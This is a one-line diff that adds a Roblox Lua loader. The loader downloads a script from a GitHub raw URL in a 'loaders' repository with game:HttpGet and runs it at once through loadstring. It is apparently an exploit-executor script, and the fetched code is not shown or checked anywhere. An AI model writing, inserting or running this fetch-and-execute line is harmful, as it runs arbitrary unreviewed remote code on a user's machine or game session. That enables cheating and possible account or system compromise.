@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/mukbang-game-testing-spam7-fqc95sp6o0o4o0.lua"))()
